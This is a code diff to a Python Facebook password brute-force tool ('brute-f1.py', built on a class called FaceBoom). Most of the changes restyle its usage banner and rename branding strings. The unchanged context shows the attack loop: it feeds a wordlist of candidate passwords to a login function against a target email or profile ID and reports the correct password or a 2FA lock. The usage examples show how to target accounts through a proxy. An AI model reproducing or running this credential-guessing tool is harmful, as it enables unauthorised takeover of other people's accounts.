@@ -144,42 +144,44 @@ class FaceBoom(object):
                      ver.write(repoVersion)
                 write("  [•] Successfully Updated :)\n")
 
-parse = optparse.OptionParser(wi+"""
-[•] Usage : python brute-f1.py [Options]
-••••••••••••••••••••••••••••••••••••••••
-―――[ Options ]―――
- |      
- |   
-[•] -t <Target Email> [or] <Facebook ID>
-Specify Target Email [or] Target Profile ID
-    
-[•] -w <Wordlist Path>                 
-Specify Wordlist (.txt) File Path
-    
-[•] -s <Single Password>         
-Specify Single Password To Check
-    
-[•] -p <Proxy IP:PORT>                 
-Specify HTTP/S Proxy (Optional)
-    
-[•] -g <Target Facebook Profile URL> 
-Specify Target Facebook Profile URL For Get  ID
-    
-[•] -u/--update                        
-Update Brute-F1 Script
+parse = optparse.OptionParser(yl+"""
+[•]+wi+ Usage : python brute-f1.py [Options]
 
-―――[ Examples ]―――
- |       
- |    
-[•] python brute-f1.py -t Asif@gmail.com -w /usr/share/wordlists/wordlist.txt
+
++gr+―――[ Options ]―――+yl+
+       
+    
+  [•]+wi+ -t <Target Email> [or] <Facebook ID>
+  Specify Target Email [or] Target Profile ID+yl+
+    
+  [•]+wi+ -w <Wordlist Path>                 
+  Specify Wordlist (.txt) File Path+yl+
+    
+  [•]+wi+ -s <Single Password>         
+  Specify Single Password To Check+yl+
+    
+  [•]+wi+ -p <Proxy IP:PORT>                 
+  Specify HTTP/S Proxy (Optional)+yl+
+    
+  [•]+wi+ -g <Target Facebook Profile URL> 
+  Specify Target Facebook Profile URL For Get  ID+yl+
+    
+  [•]+wi+ -u/--update                        
+  Update Brute-F1 Script+gr+
+  
+
+―――[ Examples ]―――+yl+
+        
      
-[•] python brute-f1.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt
+  [•]+wi+ python brute-f1.py -t Asif@gmail.com -w /usr/share/wordlists/wordlist.txt+yl+
      
-[•] python brute-f1.py -t Asif@hotmail.com  -w D:\\wordlist.txt -p 144.217.101.21:3129
+  [•]+wi+ python brute-f1.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt+yl+
      
-[•] python brute-f1.py -t Asif@gmail.com -s 1234567
+  [•]+wi+ python brute-f1.py -t Asif@hotmail.com  -w D:\\wordlist.txt -p 144.217.101.21:3129+yl+
      
-[•] python brute-f1.py -g https://www.facebook.com/username
+  [•]+wi+ python brute-f1.py -t Asif@gmail.com -s 1234567+yl+
+     
+  [•]+wi+ python brute-f1.py -g https://www.facebook.com/username+wi
      
 """)
 
@@ -250,17 +252,17 @@ def Main():
         for passwd in passwords:
                 passwd = passwd.strip()
                 if len(passwd) <6:continue
-                write(wi+"["+yl+str(loop)+wi+"] DetaSploit1 ["+yl+str(passwd)+wi+"]")
+                write(wi+"["+yl+str(loop)+wi+"] iASIF009.ME ["+yl+str(passwd)+wi+"]")
                 retCode = faceboom.login(target, passwd)
                 if retCode:
-                    sys.stdout.write(wi+" [――ASIF~DS1――] Login"+gr+" Success\n")
+                    sys.stdout.write(wi+" Login :"+gr+" Success\n")
                     print(wi+"========================="+"="*len(passwd)+"======")
                     print(wi+"["+gr+"•"+wi+"] Password [ "+gr+passwd+wi+" ]"+gr+" Is Correct :)")
                     print(wi+"========================="+"="*len(passwd)+"======")
                     if retCode == 2:print(wi+"["+yl+"•"+wi+"]"+yl+" Warning : This Account Using ("+rd+"2F Authentication"+yl+"):"+rd+" It's Locked"+yl+" !!!")
                     break
                 else:
-                    sys.stdout.write(yl+" [――ASIF~DS1――] Login"+rd+" Failed\n")
+                    sys.stdout.write(yl+" Login :"+rd+" Failed\n")
                     loop = loop + 1 if not single_passwd else "~"
         else:
                 if single_passwd:
